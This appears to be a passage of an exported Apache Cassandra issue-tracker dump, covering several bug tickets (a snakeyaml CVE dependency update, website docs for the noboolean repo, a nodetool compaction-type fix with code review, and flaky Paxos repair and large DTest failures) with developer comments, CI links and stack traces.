So that's all editorial concern about the lack of annotation in the class, well outside the scope of the change here to unblock 4.1 GA. So I'm +1 on the correctness of what's here but would love a follow-on conversation w/someone more familiar with the cas / Paxos codebase as to whether leaving it unit-free is adding value on balance.
 ;;;","07/Dec/22 00:12;bdeggleston;LGTM, thanks;;;","07/Dec/22 09:29;marianne-manaog;I closed the Jira ticket 18097 to keep everything related to this fix here and simplify the review process. The related Git commit shas of the three patches are as follows:
 # Fixed 'wait' time to be in nanoseconds for consistency, and not in microseconds: f09369df89abc136ee387726c3083e43bd1893b5
 # Invert order of numbers to compute waitNanos in Clock.java: 2316c36a01d12f04960d4260391ee08669893685
 # Tests to verify behaviour of ContentionStrategy backoff methods: 8ec9d77de6492189fdce92d4b09e9104c6626fae;;;","07/Dec/22 11:12;mck;The PR linked to above seems out of sync with the three commits in the previous comment.
Here's a PR that lists those three git SHAs, as well as the circleci throwaway commit.
https://github.com/apache/cassandra/pull/2044 

And here's the circleci run: https://app.circleci.com/pipelines/github/michaelsembwever/cassandra/52 ;;;","07/Dec/22 17:08;e.dimitrova;[The original PR|https://github.com/apache/cassandra/pull/2038] is back to sync and I see [~benedictb] approved it. [~aweisberg], [~jmckenzie], [~bdeggleston] , are there any concerns on your end?   ;;;","07/Dec/22 17:24;aweisberg;I am generally +1 on the fixes and tests just to unblock the release.

One line break was removed.

The test that actually checks to see if the wait times are correct would work better if it mocked time and could also check an upper bound on the time that was waited, but to unblock things I think it is fine. If there are multiple code paths that calculate or implement backoff it would be good to iterate through those configurations.

If {{testBackoffTimeElapsed}} were thorough enough we might not need {{testBackoffTime}} since that is just an implementation detail.;;;","07/Dec/22 17:51;benedict;bq. The test that actually checks to see if the wait times are correct would work better if it mocked time

We would have to mock not only time, but also _waiting_, and I think at that point you're at risk of not actually testing the behaviour correctly. If we were to introduce such a method, I would still advocate this minimal validation of the actual implementation end-to-end.;;;","07/Dec/22 18:46;jmckenzie;+1 to the combined.;;;","07/Dec/22 20:25;aweisberg;We have 3 +1 (myself, Benedict, Josh);;;","07/Dec/22 20:27;aweisberg;Committed as [f0ad7eadbeb3208e08a9339881931222fdab253b|https://github.com/apache/cassandra/commit/f0ad7eadbeb3208e08a9339881931222fdab253b];;;","03/Jan/23 20:26;dcapwell;This made it into 4.1 right?  so should have fixed version of 4.1?;;;","17/Jan/23 10:21;smiklosovic;[~dcapwell] I think you are right. I updated the fixed version.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
snakeyaml-1.26.jar: CVE-2022-41854,CASSANDRA-18083,13507491,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,30/Nov/22 15:22,12/Apr/23 10:39,13/Jul/23 08:40,05/Dec/22 16:12,3.0.29,3.11.15,4.1.1,5.0,,,Dependencies,,,,0,,https://nvd.nist.gov/vuln/detail/CVE-2022-41854,,bereng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-18340,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Security -> Denial of Service,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Dec 05 16:12:44 UTC 2022,,,,,,,All,,,,"0|z1czu0:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/92019df4d8540b384d7fb8655f7c02293f7f7ec1,,,,,,,,,run CI,,,,,"30/Nov/22 15:33;brandon.williams;bq. Those using Snakeyaml to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stack overflow.

I don't think we need to worry about this, similar to CASSANDRA-17907.;;;","30/Nov/22 16:06;brandon.williams;3.0 also has (for snakeyaml):

https://nvd.nist.gov/vuln/detail/CVE-2022-38752
https://nvd.nist.gov/vuln/detail/CVE-2022-38751
https://nvd.nist.gov/vuln/detail/CVE-2022-38750
https://nvd.nist.gov/vuln/detail/CVE-2022-41854
https://nvd.nist.gov/vuln/detail/CVE-2022-25857
https://nvd.nist.gov/vuln/detail/CVE-2022-38749

which are all also about parsing untrusted files resulting in a DOS, a scenario that is not relevant to Apache Cassandra, and these are already suppressed in 3.11 and up.

||Branch||Circle||
|[3.0|https://github.com/driftx/cassandra/tree/CASSANDRA-18083-3.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/708/workflows/1868a814-1682-4e7b-8d7f-5662d45b516b]|
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-18083-3.11]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/706/workflows/b1fe40aa-2683-42cd-b8d4-4626b9694796]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-18083-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/705/workflows/3b65caca-fa1a-4003-b7b0-45011abaf88a], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/705/workflows/3b65caca-fa1a-4003-b7b0-45011abaf88a]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-18083-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/709/workflows/75af59b5-f999-4ca7-84a0-ff40622de955], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/709/workflows/c7f2cde8-44c4-4a6a-af44-1952b4b5f8af]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-18083-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/707/workflows/ba4212f2-1654-4902-9f63-e0e0643f9cd6], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/707/workflows/789cc3a6-e7ad-4432-b435-ba3584c553c1]|
;;;","05/Dec/22 06:55;bereng;I have been thinking instances where we would be parsing 3rd party provided yaml config files and I don't think we have any. CI for 4.0 seems to have a failure around compression but it can't be related to this change. The other are known flakies. LGTM +1;;;","05/Dec/22 16:12;brandon.williams;Committed, thanks for the review!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Website downloads section should explain the noboolean repo,CASSANDRA-18059,13503195,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,17/Nov/22 15:21,18/Nov/22 15:33,13/Jul/23 08:40,18/Nov/22 15:33,NA,,,,,,Documentation/Website,,,,0,,"After CASSANDRA-17765, there are two different repositories for Redhat-based distros, depending on the distro's ability to understand simple boolean logic.  Currently we have no mention of the noboolean repo, causing users to attempt to install the wrong package.",,bereng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Nov/22 13:23;brandon.williams;Screenshot_20221118_072315.png;https://issues.apache.org/jira/secure/attachment/13052381/Screenshot_20221118_072315.png",,,,,1.0,brandon.williams,,,,,,,,,,,,,,Documentation,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Nov 18 15:32:18 UTC 2022,,,,,,,All,,,,"0|z1c9d4:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra-website/commit/9b5fa3b6d7be4a9fbb0d429fd7177bc0cb26c757,,,,,,,,,build and stage,,,,,"17/Nov/22 22:26;brandon.williams;Patch adds a noboolean example.;;;","18/Nov/22 10:39;bereng;LGTM +1

Edit: Ops apologies I missed Erik was reviewing this one.;;;","18/Nov/22 15:32;brandon.williams;I was just being sheepish about my first website commit and was hoping someone with more experience would do it for me, so I set him as the reviewer. :)

I've got it sorted though and it's now live, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Nodetool Compact set the compaction type incorrectly,CASSANDRA-18055,13502920,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Low,Fixed,maxwellguo,maxwellguo,maxwellguo,16/Nov/22 16:01,09/Dec/22 14:14,13/Jul/23 08:40,07/Dec/22 11:27,5.0,,,,,,Local/Compaction,Tool/nodetool,,,0,,"When using nodetool compactionstats to see what does the c*'s compactions are doing ,the output has got a column named ""compaction type"", but It seem that major compaction and minor compaction 's type are all name Compaction, after read the code I found that may be the the MAJOR_COMPACTION OperationType is not setted into AbstractCompactionTask  
at this method : CompactionStrategyManager -> getMaximalTasks .When we peform a major compact without any arguments we will got this execute path : 

{code:java}
// Some comments here
Compact.java : probe.forceKeyspaceCompaction(splitOutput, keyspace, tableNames);
--->
 ColumnFamilyStore.java :  cfStore.forceMajorCompaction(splitOutput);
---> 
CompactionManager.java : submitMaximal(cfStore, gcBefore, splitOutput, OperationType.MAJOR_COMPACTION); 
{code} 
Unfortunately OperationType.MAJOR_COMPACTION is not rightly setted.


see the picture on the right I perform a major compact , and on the left the compactionstats show the type is only Compaction ;
I think it is import for us to know wether the task is a major or a minor .


 ",,blambov,brandon.williams,e.dimitrova,maxwellguo,,,,,,,,,,,"Maxwell-Guo opened a new pull request, #2021:
URL: https://github.com/apache/cassandra/pull/2021

   Nodetool Compact set the compaction type incorrectly for CASSANDRA-18055
   
   
   The [Cassandra -18055](https://issues.apache.org/jira/browse/CASSANDRA-18055)
   
   


;17/Nov/22 10:28;githubbot;600","Maxwell-Guo closed pull request #2021: Nodetool Compact set the compaction type incorrectly for CASSANDRA-18055
URL: https://github.com/apache/cassandra/pull/2021


;17/Nov/22 12:58;githubbot;600","Maxwell-Guo opened a new pull request, #2022:
URL: https://github.com/apache/cassandra/pull/2022

   Nodetool Compact set the compaction type incorrectly for CASSANDRA-18055
   The [Cassandra 18055](https://issues.apache.org/jira/browse/CASSANDRA-18055)
   
   


;17/Nov/22 13:07;githubbot;600","blambov commented on code in PR #2022:
URL: https://github.com/apache/cassandra/pull/2022#discussion_r1040995596


##########
test/unit/org/apache/cassandra/db/compaction/CompactionTaskTest.java:
##########
@@ -191,4 +191,13 @@ public void testOfflineCompaction()
             cfs.getTracker().removeUnsafe(sstables);
         }
     }
+    
+    @Test
+    public void testMajorCompactTask()
+    {
+        //major compact without range/pk specified 
+        CompactionTasks compactionTasks = cfs.getCompactionStrategyManager().getMaximalTasks(Integer.MAX_VALUE, false, OperationType.MAJOR_COMPACTION);
+        boolean anyMatch = compactionTasks.stream().anyMatch(task -> !(task.compactionType.equals(OperationType.MAJOR_COMPACTION)));

Review Comment:
   Nit: The double negation is a bit confusing. Why not
   `Assert.assertTrue(compactionTasks.stream().allMatch(task -> task.compactionType.equals(OperationType.MAJOR_COMPACTION))`?



##########
src/java/org/apache/cassandra/db/compaction/CompactionStrategyManager.java:
##########
@@ -1004,7 +1004,7 @@ public CompactionTasks getMaximalTasks(final int gcBefore, final boolean splitOu
             {
                 for (AbstractStrategyHolder holder : holders)
                 {
-                    tasks.addAll(holder.getMaximalTasks(gcBefore, splitOutput));
+                    tasks.addAll(holder.getMaximalTasks(gcBefore, splitOutput).stream().map(task ->task.setCompactionType(operationType)).collect(Collectors.toList()));

Review Comment:
   Nit: We usually avoid streams in situations like this because they create too many intermediate objects (in this case, streams, transformations, captured state, plus a collection to hold the result). The direct implementation is just as concise and clearer:
   ```
   for (CompactionTask task : holder.getMaximalTasks(gcBefore, splitOutput))
       tasks.add(task.setCompactionType(operationType));
   ```



;06/Dec/22 14:10;githubbot;600","Maxwell-Guo commented on code in PR #2022:
URL: https://github.com/apache/cassandra/pull/2022#discussion_r1041074789


##########
test/unit/org/apache/cassandra/db/compaction/CompactionTaskTest.java:
##########
@@ -191,4 +191,13 @@ public void testOfflineCompaction()
             cfs.getTracker().removeUnsafe(sstables);
         }
     }
+    
+    @Test
+    public void testMajorCompactTask()
+    {
+        //major compact without range/pk specified 
+        CompactionTasks compactionTasks = cfs.getCompactionStrategyManager().getMaximalTasks(Integer.MAX_VALUE, false, OperationType.MAJOR_COMPACTION);
+        boolean anyMatch = compactionTasks.stream().anyMatch(task -> !(task.compactionType.equals(OperationType.MAJOR_COMPACTION)));

Review Comment:
   +1 on this
   



;06/Dec/22 14:50;githubbot;600","Maxwell-Guo commented on code in PR #2022:
URL: https://github.com/apache/cassandra/pull/2022#discussion_r1041087200


##########
src/java/org/apache/cassandra/db/compaction/CompactionStrategyManager.java:
##########
@@ -1004,7 +1004,7 @@ public CompactionTasks getMaximalTasks(final int gcBefore, final boolean splitOu
             {
                 for (AbstractStrategyHolder holder : holders)
                 {
-                    tasks.addAll(holder.getMaximalTasks(gcBefore, splitOutput));
+                    tasks.addAll(holder.getMaximalTasks(gcBefore, splitOutput).stream().map(task ->task.setCompactionType(operationType)).collect(Collectors.toList()));

Review Comment:
   finished



;06/Dec/22 15:00;githubbot;600","Maxwell-Guo closed pull request #2022: Nodetool Compact set the compaction type incorrectly for CASSANDRA-18055
URL: https://github.com/apache/cassandra/pull/2022


;09/Dec/22 14:14;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,4200,,,0,4200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Nov/22 15:59;maxwellguo;20221116235846.jpg;https://issues.apache.org/jira/secure/attachment/13052284/20221116235846.jpg",,,,,1.0,maxwellguo,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Dec 07 11:27:32 UTC 2022,,,,,,,All,,,,"0|z1c7o8:",9223372036854775807,,,,blambov,brandon.williams,,,Low,,NA,,https://github.com/apache/cassandra/commit/3f83396b76115a25b8189410c68775f87f31f8ac,,,,,,,,,ut and dt,,,,,"17/Nov/22 13:11;maxwellguo;I just add one ut for this patch , the ut just perform a major without range /dk specified. and I found it not easy to add test for this because when perform a major at one time and the compactionstast at another time ,the compaction task may just finished before the compactionstast command finished its's execution. 
[~brandon.williams][~stefan.miklosovic] can you give some advice on this patch ? or just help to have a look on this
;;;","17/Nov/22 14:41;brandon.williams;[~maxwellguo] can you link the patch to this ticket?;;;","18/Nov/22 02:02;maxwellguo;[~brandon.williams] wait ,just one failed test case.

;;;","18/Nov/22 07:16;maxwellguo;[~brandon.williams]

PR : https://github.com/apache/cassandra/pull/2022
CI : Java-8 precommit : https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/337/workflows/9a8d11af-25cc-4ecf-aaed-b957f6653696
       Java-11 precommit : https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/337/workflows/3b713125-569c-4d05-969c-dedb0aa34f47;;;","01/Dec/22 16:50;brandon.williams;I reran your PR through CI, including a repeated test for CompactionTaskTest: [j8|https://app.circleci.com/pipelines/github/driftx/cassandra/710/workflows/7a9c4adb-aa8d-4c48-8f32-6f878e1c63fc], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/710/workflows/ab31cc66-501a-4998-95fe-79a2da11166f]. Everything passed and looks good to me.;;;","02/Dec/22 02:40;maxwellguo;Thanks [~brandon.williams].
Is there something we should do before this patch can be checkin ? Need another one to review and +1 ?  ;;;","02/Dec/22 02:46;brandon.williams;Correct.;;;","02/Dec/22 03:16;e.dimitrova;Ok, so do we consider this trunk improvement or a bug we plan to fix also in other branches?
I can probably take a look tomorrow if no one gets to it before me. ;;;","02/Dec/22 04:49;maxwellguo;Thanks [~e.dimitrova], I think trunk improvement is ok ? what is your opinion？ [~brandon.williams];;;","02/Dec/22 12:04;brandon.williams;Since this isn't strictly a cosmetic fix, I was thinking going to trunk only would be fine since nobody was pushing for other branches.  If someone ever does want a backport later, they'll have the benefit of additional testing from being in trunk first.;;;","05/Dec/22 22:14;e.dimitrova;[~barnie], do you mind to take a look into this small patch, please? ;;;","06/Dec/22 15:08;maxwellguo;hi [~barnie]  I have update the patch again after your comment.;;;","06/Dec/22 16:23;blambov;The patch looks good to me.;;;","07/Dec/22 02:23;maxwellguo;[~blambov][~brandon.williams][~e.dimitrova]Thanks ~~~;;;","07/Dec/22 06:38;maxwellguo;[~brandon.williams] and [~blambov] all + 1 on this patch . So I think it is ready to commit ;;;","07/Dec/22 11:27;brandon.williams;Committed, thanks everyone!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fix flaky o.a.c.distributed.test.PaxosRepair2Test.paxosRepairHistoryIsntUpdatedInForcedRepair,CASSANDRA-18047,13502587,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jonmeredith,smiklosovic,smiklosovic,14/Nov/22 22:45,03/May/23 20:58,13/Jul/23 08:40,03/May/23 20:58,4.1.2,5.0,,,,,CI,,,,0,,"This test was introduced by CASSANDRA-18029

 
{code:java}
junit.framework.AssertionFailedError: Repair failed with errors: [Repair session 864c53d0-61fe-11ed-935f-5103a8e332f7 for range [(-3074457345618258603,3074457345618258601], (9223372036854775805,-3074457345618258603], (3074457345618258601,9223372036854775805]] failed with error UNKNOWN failure response from /127.0.0.3:7012, Repair command #1 finished with error] at org.apache.cassandra.distributed.test.PaxosRepair2Test.lambda$repair$54f7d7c2$1(PaxosRepair2Test.java:186) at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:96) at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:61) at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:71) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) at java.lang.Thread.run(Thread.java:748)
{code}
different error:
{code:java}
junit.framework.AssertionFailedError: Repair failed with errors: [Endpoint not alive: /127.0.0.3:7012, Repair command #1 finished with error]
	at org.apache.cassandra.distributed.test.PaxosRepair2Test.lambda$repair$54f7d7c2$1(PaxosRepair2Test.java:186)
	at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:96)
	at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:61)
	at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:71)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.lang.Thread.run(Thread.java:748)
{code}",,bdeggleston,dcapwell,jlewandowski,jonmeredith,maedhroz,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-18292,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-18445,,,,,,,,,,0.0,jonmeredith,,,,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed May 03 20:42:31 UTC 2023,,,,,,,All,,,,"0|z1c5mg:",9223372036854775807,,,,bdeggleston,,,,,,4.1.0,,https://github.com/apache/cassandra/commit/602ffcbf3e4ead4732fdf46d506165f63d80a9a4,,,,,,,,,circle,,,,,"01/Mar/23 19:47;dcapwell;I saw this issue in CASSANDRA-18292 and found it was due to the test stopping node3 but not block waiting for that to complete, so some times the test runs with node3 alive, causing repair to fail.

I fixed the test in CASSANDRA-18292 by blocking on the future, which should make it stable.  

CASSANDRA-18048 looks like a different issue, so think that is still open;;;","01/Mar/23 21:46;dcapwell;Believe this issue is fixed by CASSANDRA-18292, repeat tests also show that the issue is not happening anymore;;;","27/Mar/23 13:44;jlewandowski;[~dcapwell] the test run you attached for CASSANDRA-18292 does not seem to prove it resolved this issue - https://app.circleci.com/pipelines/github/dcapwell/cassandra/1905/workflows/84ab75da-8b79-4236-bed6-7ec252d666cf/jobs/17205/tests

could you take a look once again? I noticed it failed on unrelated 4.1-based feature branch;;;","27/Mar/23 15:28;jlewandowski;Here is a fresh rerun on the current {{cassandra-4.1}} branch - https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/665/workflows/54c999f3-5cef-4182-bd1b-e580072aaee4/jobs/7908/parallel-runs/8?filterBy=ALL
;;;","27/Apr/23 15:57;jonmeredith;Looks like most of the flakes are cured by waiting for node3 to shutdown before starting the repair. With that fixed there are some less common issues in `legacyPurgeRepairLoop`

working in branch https://github.com/jonmeredith/cassandra/tree/C18047-4.1;;;","02/May/23 02:24;jonmeredith;Down to 1 failure across all the runs completed at this time.

*+4.1 +*
[PR|https://github.com/apache/cassandra/pull/2301]
[J8 repeats|https://app.circleci.com/pipelines/github/jonmeredith/cassandra/798/workflows/2ce56412-9b72-4c0e-9e00-398631d4f454/jobs/9039]
[J11 repeats|https://app.circleci.com/pipelines/github/jonmeredith/cassandra/798/workflows/a725c99f-2137-4f49-bfa3-fa99747b193c]

*+trunk +*
[PR|https://github.com/apache/cassandra/pull/2302] 
[J8 repeats|https://app.circleci.com/pipelines/github/jonmeredith/cassandra/797/workflows/a95af6ee-c7fa-4fe9-bc89-fc94a30e6b25]
[J11 repeats|https://app.circleci.com/pipelines/github/jonmeredith/cassandra/797/workflows/70a6f7ba-2b46-4677-8397-7c92ecedd6fa]

Failure seems to be a {{null}} in a lambda - maybe that's why it's unsafe to update the state...

{code}
[junit-timeout] Testcase: legacyPurgeRepairLoop(org.apache.cassandra.distributed.test.PaxosRepair2Test):        FAILED
[junit-timeout] null
[junit-timeout] junit.framework.AssertionFailedError
[junit-timeout]         at org.apache.cassandra.distributed.test.PaxosRepair2Test.lambda$null$13(PaxosRepair2Test.java:521)
[junit-timeout]         at org.apache.cassandra.service.paxos.PaxosState.updateStateUnsafe(PaxosState.java:557)
[junit-timeout]         at org.apache.cassandra.distributed.test.PaxosRepair2Test.lambda$legacyPurgeRepairLoop$1b03105c$1(PaxosRepair2Test.java:515)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)
[junit-timeout]         at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
[junit-timeout]         at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
[junit-timeout]         at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
[junit-timeout]         at java.lang.Thread.run(Thread.java:750)
{code}

Lambda - L521
{code}
Assert.assertTrue(committed.localDeletionTime < nowInSec);
{code}

Despite the failure, it's a big improvement on failing ~50% of the time on 4.1
;;;","03/May/23 16:20;bdeggleston;LGTM, thanks;;;","03/May/23 17:03;jonmeredith;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.1|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-18047-cassandra-4.1-0D9D9D6B-4A3B-4AF4-A734-514C7025FF98]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-18047-cassandra-4.1-0D9D9D6B-4A3B-4AF4-A734-514C7025FF98]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/2446/]|
|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-18047-trunk-0D9D9D6B-4A3B-4AF4-A734-514C7025FF98]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-18047-trunk-0D9D9D6B-4A3B-4AF4-A734-514C7025FF98]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/2447/]|
;;;","03/May/23 20:42;jonmeredith;Only test failure was OOM in the junit formatter. Proceeding with commit.


for future ref
https://app.circleci.com/pipelines/github/jonmeredith/cassandra/804/workflows/aeae322e-da34-4dca-9e01-a2dd257d2ce0/jobs/9578/parallel-runs/8?filterBy=FAILED
{code}
[junit-timeout] Testsuite: org.apache.cassandra.distributed.test.PaxosRepair2Test
[junit-timeout] Exception in thread ""main"" java.lang.OutOfMemoryError: Java heap space
[junit-timeout]         at java.util.Arrays.copyOf(Arrays.java:3332)
[junit-timeout]         at java.lang.AbstractStringBuilder.ensureCapacityInternal(AbstractStringBuilder.java:124)
[junit-timeout]         at java.lang.AbstractStringBuilder.append(AbstractStringBuilder.java:448)
[junit-timeout]         at java.lang.StringBuffer.append(StringBuffer.java:276)
[junit-timeout]         at org.apache.cassandra.CassandraBriefJUnitResultFormatter.endTestSuite(CassandraBriefJUnitResultFormatter.java:174)
[junit-timeout]         at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.fireEndTestSuite(JUnitTestRunner.java:853)
[junit-timeout]         at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.run(JUnitTestRunner.java:577)
[junit-timeout]         at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.launch(JUnitTestRunner.java:1196)
[junit-timeout]         at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.main(JUnitTestRunner.java:1041)
[junit-timeout] Testsuite: org.apache.cassandra.distributed.test.PaxosRepair2Test
[junit-timeout] Testsuite: org.apache.cassandra.distributed.test.PaxosRepair2Test Tests run: 1, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 0 sec
[junit-timeout]
[junit-timeout] Testcase: org.apache.cassandra.distributed.test.PaxosRepair2Test:paxosRepairHistoryIsntUpdatedInForcedRepair:   Caused an ERROR
[junit-timeout] Forked Java VM exited abnormally. Please note the time in the report does not reflect the time until the VM exit.
[junit-timeout] junit.framework.AssertionFailedError: Forked Java VM exited abnormally. Please note the time in the report does not reflect the time until the VM
exit.
[junit-timeout]         at java.util.Vector.forEach(Vector.java:1277)
[junit-timeout]         at java.util.Vector.forEach(Vector.java:1277)
{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
A few large DTests failing on trunk after  CASSANDRA-17679,CASSANDRA-18046,13502519,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jmckenzie,e.dimitrova,e.dimitrova,14/Nov/22 21:08,07/Mar/23 10:38,13/Jul/23 08:40,28/Nov/22 19:04,5.0,,,,,,CI,,,,0,,"While testing CASSANDRA-18001 I noticed that a few large DTests are failing after CASSANDRA-17679. [https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/2129/workflows/885a9ac1-cf12-4fe2-8e27-431af0cd7417/jobs/16691/tests#failed-test-3]

[TestMaterializedViews.test_add_dc_after_mv_network_replication (large)|https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-trunk/failure/materialized_views_test/TestMaterializedViews/test_add_dc_after_mv_network_replication]

[TestMaterializedViews.test_add_dc_after_mv_network_replication (large-novnode)|https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-trunk/failure/materialized_views_test/TestMaterializedViews/test_add_dc_after_mv_network_replication]

[TestReplaceAddress.test_resume_failed_replace (large)|https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-trunk/failure/replace_address_test/TestReplaceAddress/test_resume_failed_replace]

[TestReplaceAddress.test_resume_failed_replace (large-novnode)|https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-trunk/failure/replace_address_test/TestReplaceAddress/test_resume_failed_replace]

